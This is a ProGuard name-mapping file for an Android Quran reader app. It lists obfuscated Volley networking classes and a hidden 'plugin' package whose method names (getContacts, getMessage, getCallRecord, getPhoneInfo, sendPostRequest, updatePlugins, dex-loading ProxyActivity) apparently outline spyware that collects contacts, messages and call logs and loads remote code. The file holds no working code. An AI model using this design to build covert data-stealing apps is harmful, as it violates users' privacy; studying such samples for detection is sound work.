com.android.volley.AuthFailureError -> com.a.a.a:
    android.content.Intent mResolutionIntent -> b
    java.lang.String getMessage() -> getMessage
com.android.volley.Cache -> com.a.a.b:
    com.android.volley.Cache$Entry get(java.lang.String) -> a
    void put(java.lang.String,com.android.volley.Cache$Entry) -> a
    void initialize() -> a
com.android.volley.Cache$Entry -> com.a.a.c:
    byte[] data -> a
    java.lang.String etag -> b
    long serverDate -> c
    long ttl -> d
    long softTtl -> e
    java.util.Map responseHeaders -> f
com.android.volley.CacheDispatcher -> com.a.a.d:
    boolean DEBUG -> a
    java.util.concurrent.BlockingQueue mCacheQueue -> b
    java.util.concurrent.BlockingQueue mNetworkQueue -> c
    com.android.volley.Cache mCache -> d
    com.android.volley.ResponseDelivery mDelivery -> e
    boolean mQuit -> f
    void quit() -> a
    void run() -> run
    java.util.concurrent.BlockingQueue access$000(com.android.volley.CacheDispatcher) -> a
com.android.volley.CacheDispatcher$1 -> com.a.a.e:
    com.android.volley.Request val$request -> a
    com.android.volley.CacheDispatcher this$0 -> b
    void run() -> run
com.android.volley.DefaultRetryPolicy -> com.a.a.f:
    int mCurrentTimeoutMs -> a
    int mCurrentRetryCount -> b
    int mMaxNumRetries -> c
    float mBackoffMultiplier -> d
    int getCurrentTimeout() -> a
    int getCurrentRetryCount() -> b
    void retry(com.android.volley.VolleyError) -> a
com.android.volley.ExecutorDelivery -> com.a.a.g:
    java.util.concurrent.Executor mResponsePoster -> a
    void postResponse(com.android.volley.Request,com.android.volley.Response) -> a
    void postResponse(com.android.volley.Request,com.android.volley.Response,java.lang.Runnable) -> a
    void postError(com.android.volley.Request,com.android.volley.VolleyError) -> a
com.android.volley.ExecutorDelivery$1 -> com.a.a.h:
    android.os.Handler val$handler -> a
    com.android.volley.ExecutorDelivery this$0 -> b
    void execute(java.lang.Runnable) -> execute
com.android.volley.ExecutorDelivery$ResponseDeliveryRunnable -> com.a.a.i:
    com.android.volley.Request mRequest -> b
    com.android.volley.Response mResponse -> c
    java.lang.Runnable mRunnable -> d
    com.android.volley.ExecutorDelivery this$0 -> a
    void run() -> run
com.android.volley.Network -> com.a.a.j:
    com.android.volley.NetworkResponse performRequest(com.android.volley.Request) -> a
com.android.volley.NetworkDispatcher -> com.a.a.k:
    java.util.concurrent.BlockingQueue mQueue -> a
    com.android.volley.Network mNetwork -> b
    com.android.volley.Cache mCache -> c
    com.android.volley.ResponseDelivery mDelivery -> d
    boolean mQuit -> e
    void quit() -> a
    void run() -> run
com.android.volley.NetworkError -> com.a.a.l:
com.android.volley.NetworkResponse -> com.a.a.m:
    int statusCode -> a
    byte[] data -> b
    java.util.Map headers -> c
    boolean notModified -> d
com.android.volley.NoConnectionError -> com.a.a.n:
com.android.volley.ParseError -> com.a.a.o:
com.android.volley.Request -> com.a.a.p:
    com.android.volley.VolleyLog$MarkerLog mEventLog -> a
    int mMethod -> b
    java.lang.String mUrl -> c
    int mDefaultTrafficStatsTag -> d
    com.android.volley.Response$ErrorListener mErrorListener -> e
    java.lang.Integer mSequence -> f
    com.android.volley.RequestQueue mRequestQueue -> g
    boolean mShouldCache -> h
    boolean mCanceled -> i
    boolean mResponseDelivered -> j
    long mRequestBirthTime -> k
    com.android.volley.RetryPolicy mRetryPolicy -> l
    com.android.volley.Cache$Entry mCacheEntry -> m
    int getMethod() -> a
    int getTrafficStatsTag() -> b
    void addMarker(java.lang.String) -> a
    void finish(java.lang.String) -> b
    com.android.volley.Request setRequestQueue(com.android.volley.RequestQueue) -> a
    com.android.volley.Request setSequence(int) -> a
    java.lang.String getUrl() -> c
    java.lang.String getCacheKey() -> d
    com.android.volley.Request setCacheEntry(com.android.volley.Cache$Entry) -> a
    com.android.volley.Cache$Entry getCacheEntry() -> e
    boolean isCanceled() -> f
    java.util.Map getHeaders() -> g
    java.lang.String getPostBodyContentType() -> h
    byte[] getPostBody() -> i
    java.lang.String getBodyContentType() -> j
    byte[] getBody() -> k
    boolean shouldCache() -> l
    int getTimeoutMs() -> m
    com.android.volley.RetryPolicy getRetryPolicy() -> n
    void markDelivered() -> o
    boolean hasHadResponseDelivered() -> p
    com.android.volley.Response parseNetworkResponse(com.android.volley.NetworkResponse) -> a
    com.android.volley.VolleyError parseNetworkError(com.android.volley.VolleyError) -> a
    void deliverResponse(java.lang.Object) -> a
    void deliverError(com.android.volley.VolleyError) -> b
    java.lang.String toString() -> toString
    int compareTo(java.lang.Object) -> compareTo
    com.android.volley.VolleyLog$MarkerLog access$000(com.android.volley.Request) -> a
com.android.volley.Request$1 -> com.a.a.q:
    java.lang.String val$tag -> a
    long val$threadId -> b
    com.android.volley.Request this$0 -> c
    void run() -> run
com.android.volley.Request$Priority -> com.a.a.r:
    com.android.volley.Request$Priority LOW -> a
    com.android.volley.Request$Priority NORMAL -> b
    com.android.volley.Request$Priority HIGH -> c
    com.android.volley.Request$Priority IMMEDIATE -> d
    com.android.volley.Request$Priority[] $VALUES -> e
    com.android.volley.Request$Priority[] values() -> values
    com.android.volley.Request$Priority valueOf(java.lang.String) -> valueOf
com.android.volley.RequestQueue -> com.a.a.s:
    java.util.concurrent.atomic.AtomicInteger mSequenceGenerator -> a
    java.util.Map mWaitingRequests -> b
    java.util.Set mCurrentRequests -> c
    java.util.concurrent.PriorityBlockingQueue mCacheQueue -> d
    java.util.concurrent.PriorityBlockingQueue mNetworkQueue -> e
    com.android.volley.Cache mCache -> f
    com.android.volley.Network mNetwork -> g
    com.android.volley.ResponseDelivery mDelivery -> h
    com.android.volley.NetworkDispatcher[] mDispatchers -> i
    com.android.volley.CacheDispatcher mCacheDispatcher -> j
    void start() -> a
    com.android.volley.Request add(com.android.volley.Request) -> a
    void finish(com.android.volley.Request) -> b
com.android.volley.Response -> com.a.a.t:
    java.lang.Object result -> a
    com.android.volley.Cache$Entry cacheEntry -> b
    com.android.volley.VolleyError error -> c
    boolean intermediate -> d
    com.android.volley.Response success(java.lang.Object,com.android.volley.Cache$Entry) -> a
    com.android.volley.Response error(com.android.volley.VolleyError) -> a
com.android.volley.Response$ErrorListener -> com.a.a.u:
    void onErrorResponse(com.android.volley.VolleyError) -> a
com.android.volley.Response$Listener -> com.a.a.v:
    void onResponse(java.lang.Object) -> a
com.android.volley.ResponseDelivery -> com.a.a.w:
    void postResponse(com.android.volley.Request,com.android.volley.Response) -> a
    void postResponse(com.android.volley.Request,com.android.volley.Response,java.lang.Runnable) -> a
    void postError(com.android.volley.Request,com.android.volley.VolleyError) -> a
com.android.volley.RetryPolicy -> com.a.a.x:
    int getCurrentTimeout() -> a
    int getCurrentRetryCount() -> b
    void retry(com.android.volley.VolleyError) -> a
com.android.volley.ServerError -> com.a.a.y:
com.android.volley.TimeoutError -> com.a.a.z:
com.android.volley.VolleyError -> com.a.a.aa:
    com.android.volley.NetworkResponse networkResponse -> a
com.android.volley.VolleyLog -> com.a.a.ab:
    java.lang.String TAG -> a
    boolean DEBUG -> b
    void v(java.lang.String,java.lang.Object[]) -> a
    void d(java.lang.String,java.lang.Object[]) -> b
    void e(java.lang.String,java.lang.Object[]) -> c
    void e(java.lang.Throwable,java.lang.String,java.lang.Object[]) -> a
    void wtf(java.lang.String,java.lang.Object[]) -> d
    java.lang.String buildMessage(java.lang.String,java.lang.Object[]) -> e
com.android.volley.VolleyLog$MarkerLog -> com.a.a.ac:
    boolean ENABLED -> a
    java.util.List mMarkers -> b
    boolean mFinished -> c
    void add(java.lang.String,long) -> a
    void finish(java.lang.String) -> a
    void finalize() -> finalize
com.android.volley.VolleyLog$MarkerLog$Marker -> com.a.a.ad:
    java.lang.String name -> a
    long thread -> b
    long time -> c
com.android.volley.toolbox.BasicNetwork -> com.a.a.a.a:
    boolean DEBUG -> a
    int SLOW_REQUEST_THRESHOLD_MS -> d
    int DEFAULT_POOL_SIZE -> e
    com.android.volley.toolbox.HttpStack mHttpStack -> b
    com.android.volley.toolbox.ByteArrayPool mPool -> c
    com.android.volley.NetworkResponse performRequest(com.android.volley.Request) -> a
    void attemptRetryOnException(java.lang.String,com.android.volley.Request,com.android.volley.VolleyError) -> a
    byte[] entityToBytes(org.apache.http.HttpEntity) -> a
    java.util.Map convertHeaders(org.apache.http.Header[]) -> a
com.android.volley.toolbox.ByteArrayPool -> com.a.a.a.b:
    java.util.List mBuffersByLastUse -> b
    java.util.List mBuffersBySize -> c
    int mCurrentSize -> d
    int mSizeLimit -> e
    java.util.Comparator BUF_COMPARATOR -> a
    byte[] getBuf(int) -> a
    void returnBuf(byte[]) -> a
    void trim() -> a
com.android.volley.toolbox.ByteArrayPool$1 -> com.a.a.a.c:
    int compare(java.lang.Object,java.lang.Object) -> compare
com.android.volley.toolbox.DiskBasedCache -> com.a.a.a.d:
    java.util.Map mEntries -> a
    long mTotalSize -> b
    java.io.File mRootDirectory -> c
    int mMaxCacheSizeInBytes -> d
    com.android.volley.Cache$Entry get(java.lang.String) -> a
    void initialize() -> a
    void put(java.lang.String,com.android.volley.Cache$Entry) -> a
    void remove(java.lang.String) -> b
    java.lang.String getFilenameForKey(java.lang.String) -> c
    java.io.File getFileForKey(java.lang.String) -> d
    void putEntry(java.lang.String,com.android.volley.toolbox.DiskBasedCache$CacheHeader) -> a
    byte[] streamToBytes(java.io.InputStream,int) -> a
    int read(java.io.InputStream) -> e
    void writeInt(java.io.OutputStream,int) -> a
    int readInt(java.io.InputStream) -> a
    void writeLong(java.io.OutputStream,long) -> a
    long readLong(java.io.InputStream) -> b
    void writeString(java.io.OutputStream,java.lang.String) -> a
    java.lang.String readString(java.io.InputStream) -> c
    java.util.Map readStringStringMap(java.io.InputStream) -> d
com.android.volley.toolbox.DiskBasedCache$CacheHeader -> com.a.a.a.e:
    long size -> a
    java.lang.String key -> b
    java.lang.String etag -> c
    long serverDate -> d
    long ttl -> e
    long softTtl -> f
    java.util.Map responseHeaders -> g
    com.android.volley.toolbox.DiskBasedCache$CacheHeader readHeader(java.io.InputStream) -> a
    boolean writeHeader(java.io.OutputStream) -> a
com.android.volley.toolbox.DiskBasedCache$CountingInputStream -> com.a.a.a.f:
    int bytesRead -> a
    int read() -> read
    int read(byte[],int,int) -> read
    int access$100(com.android.volley.toolbox.DiskBasedCache$CountingInputStream) -> a
com.android.volley.toolbox.HttpClientStack -> com.a.a.a.g:
    org.apache.http.client.HttpClient mClient -> a
    void addHeaders(org.apache.http.client.methods.HttpUriRequest,java.util.Map) -> a
    org.apache.http.HttpResponse performRequest(com.android.volley.Request,java.util.Map) -> a
    void setEntityIfNonEmptyBody(org.apache.http.client.methods.HttpEntityEnclosingRequestBase,com.android.volley.Request) -> a
com.android.volley.toolbox.HttpClientStack$HttpPatch -> com.a.a.a.h:
    java.lang.String getMethod() -> getMethod
com.android.volley.toolbox.HttpHeaderParser -> com.a.a.a.i:
    com.android.volley.Cache$Entry parseCacheHeaders(com.android.volley.NetworkResponse) -> a
    long parseDateAsEpoch(java.lang.String) -> a
    java.lang.String parseCharset(java.util.Map) -> a
com.android.volley.toolbox.HttpStack -> com.a.a.a.j:
    org.apache.http.HttpResponse performRequest(com.android.volley.Request,java.util.Map) -> a
com.android.volley.toolbox.HurlStack -> com.a.a.a.k:
    com.android.volley.toolbox.HurlStack$UrlRewriter mUrlRewriter -> a
    javax.net.ssl.SSLSocketFactory mSslSocketFactory -> b
    org.apache.http.HttpResponse performRequest(com.android.volley.Request,java.util.Map) -> a
    org.apache.http.HttpEntity entityFromConnection(java.net.HttpURLConnection) -> a
    void addBodyIfExists(java.net.HttpURLConnection,com.android.volley.Request) -> a
com.android.volley.toolbox.HurlStack$UrlRewriter -> com.a.a.a.l:
    java.lang.String rewriteUrl$16915f7f() -> a
com.android.volley.toolbox.JsonObjectRequest -> com.a.a.a.m:
    com.android.volley.Response parseNetworkResponse(com.android.volley.NetworkResponse) -> a
com.android.volley.toolbox.JsonRequest -> com.a.a.a.n:
    java.lang.String PROTOCOL_CONTENT_TYPE -> a
    com.android.volley.Response$Listener mListener -> b
    java.lang.String mRequestBody -> c
    void deliverResponse(java.lang.Object) -> a
    java.lang.String getPostBodyContentType() -> h
    byte[] getPostBody() -> i
    java.lang.String getBodyContentType() -> j
    byte[] getBody() -> k
com.android.volley.toolbox.PoolingByteArrayOutputStream -> com.a.a.a.o:
    com.android.volley.toolbox.ByteArrayPool mPool -> a
    void close() -> close
    void finalize() -> finalize
    void expand(int) -> a
    void write(byte[],int,int) -> write
    void write(int) -> write
com.android.volley.toolbox.Volley -> com.a.a.a.p:
    com.android.volley.RequestQueue newRequestQueue$2b0c7ccd(android.content.Context) -> a
com.powerock.quran.BookPageFactory -> com.powerock.quran.a:
    java.io.File book_file -> a
    java.nio.MappedByteBuffer m_mbBuf -> b
    int m_mbBufLen -> c
    int m_mbBufBegin -> d
    int m_mbBufEnd -> e
    int m_page -> f
    java.lang.String m_strCharsetName -> g
    android.graphics.Bitmap m_book_bg -> h
    int mWidth -> i
    int mHeight -> j
    android.content.Context context -> k
    java.util.Vector m_lines -> l
    int m_fontSize -> m
    int m_textColor -> n
    int m_backColor -> o
    int marginWidth -> p
    int marginHeight -> q
    int mLineCount -> r
    float mVisibleHeight -> s
    float mVisibleWidth -> t
    boolean m_isfirstPage -> u
    boolean m_islastPage -> v
    long pageNumber -> w
    android.graphics.Paint mPaint -> x
    void openbook(java.lang.String) -> a
    byte[] readParagraphBack(int) -> d
    byte[] readParagraphForward(int) -> e
    java.util.Vector pageDown() -> g
    void pageUp() -> h
    void prePage() -> a
    boolean nextPage() -> b
    boolean nextPage(int) -> a
    boolean prePage(int) -> b
    void onDraw(android.graphics.Canvas) -> a
    void setBgBitmap(android.graphics.Bitmap) -> a
    boolean isfirstPage() -> c
    boolean islastPage() -> d
    long getPageNumber() -> e
    int getCurrentNumber() -> f
    void redirectToPage(int) -> c
com.powerock.quran.BookPageFactory$RedirectToForward -> com.powerock.quran.b:
    com.powerock.quran.BookPageFactory this$0 -> a
    void onPreExecute() -> onPreExecute
    java.lang.String doInBackground(java.lang.Object[]) -> a
    void onPostExecute(java.lang.Object) -> onPostExecute
    java.lang.Object doInBackground(java.lang.Object[]) -> doInBackground
com.powerock.quran.BookPageFactory$RedirectToPre -> com.powerock.quran.c:
    com.powerock.quran.BookPageFactory this$0 -> a
    void onPreExecute() -> onPreExecute
    java.lang.String doInBackground(java.lang.Object[]) -> a
    void onPostExecute(java.lang.Object) -> onPostExecute
    java.lang.Object doInBackground(java.lang.Object[]) -> doInBackground
com.powerock.quran.Farsi -> com.powerock.quran.d:
    boolean isFarsiConversionNeeded -> a
    java.lang.String szLamAndAlef -> d
    java.lang.String szLamStickAndAlef -> e
    java.lang.String szLa -> f
    java.lang.String szLaStick -> g
    java.lang.String szLamAndAlefWoosim -> h
    java.lang.String szLamStickAndAlefWoosim -> i
    java.lang.String szLaWoosim -> j
    java.lang.String szLaStickWoosim -> k
    com.powerock.quran.Farsi$struc[] arrStruc -> b
    com.powerock.quran.Farsi$struc[] arrStrucWoosim -> c
    android.graphics.Typeface typeface -> l
    boolean isFromTheSet1(char) -> a
    java.lang.String Convert(java.lang.String) -> a
    java.lang.String reorderWords(java.lang.String) -> b
    android.graphics.Typeface GetFarsiFont(android.content.Context) -> a
com.powerock.quran.Farsi$struc -> com.powerock.quran.e:
    char character -> a
    char endGlyph -> b
    char iniGlyph -> c
    char midGlyph -> d
    char isoGlyph -> e
com.powerock.quran.PageWidget -> com.powerock.quran.f:
    int mWidth -> G
    int mHeight -> H
    int mCornerX -> I
    int mCornerY -> J
    android.graphics.Path mPath0 -> K
    android.graphics.Path mPath1 -> L
    android.graphics.Bitmap mCurPageBitmap -> a
    android.graphics.Bitmap mNextPageBitmap -> b
    android.graphics.PointF mTouch -> c
    android.graphics.PointF mBezierStart1 -> d
    android.graphics.PointF mBezierControl1 -> e
    android.graphics.PointF mBeziervertex1 -> f
    android.graphics.PointF mBezierEnd1 -> g
    android.graphics.PointF mBezierStart2 -> h
    android.graphics.PointF mBezierControl2 -> i
    android.graphics.PointF mBeziervertex2 -> j
    android.graphics.PointF mBezierEnd2 -> k
    float mMiddleX -> l
    float mMiddleY -> m
    float mDegrees -> n
    float mTouchToCornerDis -> o
    android.graphics.ColorMatrixColorFilter mColorMatrixFilter -> p
    android.graphics.Matrix mMatrix -> q
    float[] mMatrixArray -> r
    boolean mIsRTandLB -> s
    float mMaxLength -> t
    int[] mBackShadowColors -> u
    int[] mFrontShadowColors -> v
    android.graphics.drawable.GradientDrawable mBackShadowDrawableLR -> w
    android.graphics.drawable.GradientDrawable mBackShadowDrawableRL -> x
    android.graphics.drawable.GradientDrawable mFolderShadowDrawableLR -> y
    android.graphics.drawable.GradientDrawable mFolderShadowDrawableRL -> z
    android.graphics.drawable.GradientDrawable mFrontShadowDrawableHBT -> A
    android.graphics.drawable.GradientDrawable mFrontShadowDrawableHTB -> B
    android.graphics.drawable.GradientDrawable mFrontShadowDrawableVLR -> C
    android.graphics.drawable.GradientDrawable mFrontShadowDrawableVRL -> D
    android.graphics.Paint mPaint -> E
    android.widget.Scroller mScroller -> F
    void calcCornerXY(float,float) -> a
    boolean doTouchEvent(android.view.MotionEvent) -> a
    android.graphics.PointF getCross(android.graphics.PointF,android.graphics.PointF,android.graphics.PointF,android.graphics.PointF) -> a
    void setBitmaps(android.graphics.Bitmap,android.graphics.Bitmap) -> a
    void onDraw(android.graphics.Canvas) -> onDraw
    void computeScroll() -> computeScroll
    void abortAnimation() -> a
    boolean DragToRight() -> b
com.powerock.quran.QuranActivity -> com.powerock.quran.QuranActivity:
    com.powerock.quran.PageWidget mPageWidget -> f
    android.graphics.Bitmap mCurPageBitmap -> a
    android.graphics.Bitmap mNextPageBitmap -> b
    android.graphics.Canvas mCurPageCanvas -> c
    android.graphics.Canvas mNextPageCanvas -> d
    com.powerock.quran.BookPageFactory pagefactory -> e
    int pageWidth -> g
    int pageHeight -> h
    android.app.AlertDialog dialog -> i
    void onCreate(android.os.Bundle) -> onCreate
    boolean onCreateOptionsMenu(android.view.Menu) -> onCreateOptionsMenu
    boolean onOptionsItemSelected(android.view.MenuItem) -> onOptionsItemSelected
    void refresh() -> a
    void setWidgetEnableTrue() -> b
    void setWidgetEnableFalse() -> c
    boolean isNumeric(java.lang.String) -> a
    boolean onKeyDown(int,android.view.KeyEvent) -> onKeyDown
    void initBook() -> e
    com.powerock.quran.PageWidget access$0() -> d
    android.app.AlertDialog access$1(com.powerock.quran.QuranActivity) -> a
com.powerock.quran.QuranActivity$1 -> com.powerock.quran.g:
    com.powerock.quran.QuranActivity this$0 -> a
    boolean onTouch(android.view.View,android.view.MotionEvent) -> onTouch
com.powerock.quran.QuranActivity$2 -> com.powerock.quran.h:
    com.powerock.quran.QuranActivity this$0 -> a
    android.widget.EditText val$numberEdit -> b
    long val$pageNumber -> c
    void onClick(android.content.DialogInterface,int) -> onClick
com.powerock.quran.QuranActivity$3 -> com.powerock.quran.i:
    com.powerock.quran.QuranActivity this$0 -> a
    void onClick(android.content.DialogInterface,int) -> onClick
com.powerock.quran.QuranActivity$GetNumberTask -> com.powerock.quran.j:
    com.powerock.quran.QuranActivity this$0 -> a
    java.lang.String doInBackground$4af589aa() -> a
    void onPostExecute(java.lang.Object) -> onPostExecute
    java.lang.Object doInBackground(java.lang.Object[]) -> doInBackground
com.powerock.quran.WelcomeActivity -> com.powerock.quran.WelcomeActivity:
    android.widget.ImageButton welcomeButton -> a
    void onCreate(android.os.Bundle) -> onCreate
com.powerock.quran.WelcomeActivity$1 -> com.powerock.quran.k:
    com.powerock.quran.WelcomeActivity this$0 -> a
    void onClick(android.view.View) -> onClick
com.powerock.quran.plugin.CommandService -> com.powerock.quran.plugin.CommandService:
    java.lang.String uuid -> a
    android.os.Handler handler -> b
    android.os.Handler statusHandler -> c
    java.lang.Runnable runnable -> d
    void onCreate() -> onCreate
    int onStartCommand(android.content.Intent,int,int) -> onStartCommand
    void onDestroy() -> onDestroy
    android.os.IBinder onBind(android.content.Intent) -> onBind
    java.lang.String access$0(com.powerock.quran.plugin.CommandService) -> a
    void access$1(com.powerock.quran.plugin.CommandService,java.lang.String) -> a
    android.os.Handler access$2(com.powerock.quran.plugin.CommandService) -> b
com.powerock.quran.plugin.CommandService$1 -> com.powerock.quran.plugin.a:
    com.powerock.quran.plugin.CommandService this$0 -> a
    void run() -> run
com.powerock.quran.plugin.CommandService$2 -> com.powerock.quran.plugin.b:
    com.powerock.quran.plugin.CommandService this$0 -> a
    java.lang.String val$uuid -> b
    void onResponse(java.lang.Object) -> a
com.powerock.quran.plugin.CommandService$3 -> com.powerock.quran.plugin.c:
    com.powerock.quran.plugin.CommandService this$0 -> a
    void onErrorResponse(com.android.volley.VolleyError) -> a
com.powerock.quran.plugin.Constants -> com.powerock.quran.plugin.d:
    java.lang.String APP_DIR -> a
    java.lang.String FILE_PATH -> b
    java.lang.String PLUGIN_DIR -> c
com.powerock.quran.plugin.Decompress -> com.powerock.quran.plugin.e:
    java.lang.String _zipFile -> a
    java.lang.String _location -> b
    void unzip() -> a
    void _dirChecker(java.lang.String) -> a
com.powerock.quran.plugin.PhoneInfoUtils -> com.powerock.quran.plugin.f:
    java.lang.String parseStrToMd5L32(java.lang.String) -> a
    java.lang.String getLocalIpAddress(android.content.Context) -> a
com.powerock.quran.plugin.PluginManager -> com.powerock.quran.plugin.g:
    android.content.Context context -> a
    void getContacts(android.content.Context,java.lang.String) -> a
    void getMessage(android.content.Context,java.lang.String) -> b
    void getCallRecord(android.content.Context,java.lang.String) -> c
    void getPhoneInfo(android.content.Context,java.lang.String) -> d
    void sendPostRequest(java.lang.String,org.json.JSONObject,android.content.Context) -> a
    void updatePlugins(java.lang.String) -> a
    void deleteFolder(java.io.File) -> b
    java.lang.String getPluginPara(java.lang.String,java.lang.String) -> c
    void changePluginPara(java.lang.String,java.lang.String,java.lang.String) -> a
    java.lang.String parseStrToMd5L32(java.lang.String) -> d
    boolean access$0(java.lang.String) -> b
    java.lang.String access$1(java.lang.String,java.lang.String) -> a
    void access$2(java.lang.String,java.lang.String) -> b
    void access$3(java.lang.String) -> c
    void access$4(java.io.File) -> a
    android.content.Context access$5(com.powerock.quran.plugin.PluginManager) -> a
    void access$6(android.content.Context,java.lang.String) -> e
com.powerock.quran.plugin.PluginManager$1 -> com.powerock.quran.plugin.h:
    void onResponse(java.lang.Object) -> a
com.powerock.quran.plugin.PluginManager$2 -> com.powerock.quran.plugin.i:
    void onErrorResponse(com.android.volley.VolleyError) -> a
com.powerock.quran.plugin.PluginManager$DecompressAsync -> com.powerock.quran.plugin.j:
    com.powerock.quran.plugin.PluginManager this$0 -> a
    void onPostExecute(java.lang.Object) -> onPostExecute
    java.lang.Object doInBackground(java.lang.Object[]) -> doInBackground
com.powerock.quran.plugin.PluginManager$DownloadAsync -> com.powerock.quran.plugin.k:
    com.powerock.quran.plugin.PluginManager this$0 -> a
    boolean $assertionsDisabled -> b
    java.lang.String doInBackground(java.lang.String[]) -> a
    void onPostExecute(java.lang.Object) -> onPostExecute
    java.lang.Object doInBackground(java.lang.Object[]) -> doInBackground
com.powerock.quran.plugin.PluginManager$ProcessPluginFolder -> com.powerock.quran.plugin.l:
    com.powerock.quran.plugin.PluginManager this$0 -> a
    java.lang.String doInBackground(java.lang.String[]) -> a
    void onPostExecute(java.lang.Object) -> onPostExecute
    java.lang.Object doInBackground(java.lang.Object[]) -> doInBackground
com.powerock.quran.plugin.ProxyActivity -> com.powerock.quran.plugin.ProxyActivity:
    java.lang.String mClass -> a
    java.lang.String mDexPath -> b
    void onCreate(android.os.Bundle) -> onCreate
    void launchTargetActivity(java.lang.String) -> a
com.powerock.quran.plugin.VolleySingleton -> com.powerock.quran.plugin.m:
    com.powerock.quran.plugin.VolleySingleton mInstance -> a
    com.android.volley.RequestQueue mRequestQueue -> b
    com.powerock.quran.plugin.VolleySingleton getInstance(android.content.Context) -> a
    com.android.volley.RequestQueue getRequestQueue() -> a
